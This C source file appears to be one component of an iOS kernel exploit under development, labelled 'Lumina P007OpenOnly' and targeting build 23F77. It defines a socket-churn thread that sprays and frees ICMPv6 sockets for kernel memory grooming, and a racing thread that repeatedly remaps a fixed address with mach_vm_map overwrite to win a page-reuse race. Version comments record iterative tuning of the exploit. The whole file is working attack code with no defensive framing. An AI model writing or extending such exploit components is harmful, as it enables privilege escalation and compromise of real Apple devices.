// free_thread.c
// Lumina P007OpenOnly - Swap thread + Socket churn thread
// V44: Error-tolerant mach_vm_map (don't kill thread on failure)

#include "common.h"
#include "free_thread.h"

#include <pthread/qos.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <unistd.h>
#include <stdio.h>

// Socket churn thread - global variable
extern volatile int churn_go;

void *churn_thread(void *arg) {
    (void)arg;
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    while (churn_go) {
        int fds[512];
        int count = 0;
        for (int i = 0; i < 512; i++) {
            fds[i] = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
            if (fds[i] >= 0) count++;
        }
        for (int i = 0; i < 512; i++) {
            if (fds[i] >= 0) close(fds[i]);
        }
        if (count > 0) {
            LOG("socket churn: created %d, closed %d", count, count);
        }
        usleep(50);
    }
    return NULL;
}

void* free_thread_worker(void* arg) {
    free_thread_shared_t* shared = arg;

    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    while (atomic_load_explicit(&shared->free_thread_start, memory_order_seq_cst) == 0);

    mach_vm_address_t free_target = atomic_load_explicit(&shared->free_target_sync, memory_order_seq_cst);
    mach_vm_size_t free_target_size = atomic_load_explicit(&shared->free_target_size_sync, memory_order_seq_cst);

    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) == 0);

    uint64_t map_success_count = 0;
    uint64_t map_fail_count = 0;

    while (atomic_load_explicit(&shared->go_sync, memory_order_seq_cst) != 0) {
        while (atomic_load_explicit(&shared->race_sync, memory_order_seq_cst) == 0);

        mach_port_t target_object = (mach_port_t)atomic_load_explicit(&shared->target_object_sync, memory_order_seq_cst);
        mach_vm_offset_t target_object_offset = atomic_load_explicit(&shared->target_object_offset_sync, memory_order_seq_cst);
        mach_vm_address_t target_addr = free_target;

        // V44 FIX: Error-tolerant mach_vm_map.
        // Don't kill the thread on failure — just log and try again next iteration.
        // On 23F77, mach_vm_map may fail on wired pages, but the VM cyclers will
        // eventually cycle those pages back to the free pool where remap succeeds.
        kern_return_t kr = mach_vm_map(mach_task_self(), &target_addr, free_target_size, 0,
                                       VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                                       target_object, target_object_offset, false,
                                       VM_PROT_DEFAULT, VM_PROT_DEFAULT, VM_INHERIT_NONE);
        
        if (kr == KERN_SUCCESS) {
            map_success_count++;
            // Log every 100th success to track progress
            if ((map_success_count % 100) == 0) {
                LOG("free_thread: map SUCCESS (count=%llu, fail=%llu)",
                    map_success_count, map_fail_count);
            }
        } else {
            map_fail_count++;
            // Log every 256th failure to avoid spam
            if ((map_fail_count & 0xFF) == 0) {
                LOG("free_thread: map FAIL (count=%llu, success=%llu): %s",
                    map_fail_count, map_success_count, mach_error_string(kr));
            }
        }

        atomic_store_explicit(&shared->race_sync, 0, memory_order_seq_cst);
    }

    LOG("free_thread: FINAL success=%llu fail=%llu", map_success_count, map_fail_count);
    return NULL;
}
